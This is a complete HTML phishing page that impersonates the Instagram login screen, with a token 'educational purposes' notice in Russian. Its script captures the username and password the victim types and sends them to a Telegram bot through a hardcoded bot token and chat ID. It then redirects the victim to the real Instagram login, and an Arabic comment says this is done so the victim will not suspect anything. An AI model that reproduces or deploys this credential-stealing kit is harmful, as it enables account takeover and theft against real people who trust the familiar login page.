<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .legal-notice { color: #28a745; font-weight: bold; margin-bottom: 20px; font-size: 14px; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        .logo { width: 175px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background-color: #0095f6; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; }
        button:disabled { background-color: #b2dffc; }
    </style>
</head>
<body>

    <div class="legal-notice">Этот сайт предназначен для образовательных целей</div>

    <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/mobile_port_monocle-7b353f0503a1.png/logo_2x.png" class="logo" alt="Instagram">
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="submitBtn">Log In</button>
        </form>
    </div>

    <script>
        const token = "8275124583:AAH_ad7HiinANwVXTPqgMNW1SsG44g6eqzo";
        const chatId = "8042090388";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const btn = document.getElementById('submitBtn');

            btn.disabled = true;
            btn.innerText = "Loading...";

            const message = `⚠️ New Login Attempt:\n👤 User: ${user}\n🔑 Pass: ${pass}`;

            // إرسال البيانات إلى بوت التلغرام
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => {
                // بعد الإرسال، نحوله لصفحة إنستغرام الحقيقية عشان ما يشك
                window.location.href = "https://www.instagram.com/accounts/login/";
            })
            .catch(error => {
                console.error('Error:', error);
                alert("Technical Error. Try again.");
                btn.disabled = false;
            });
        });
    </script>
</body>
</html>
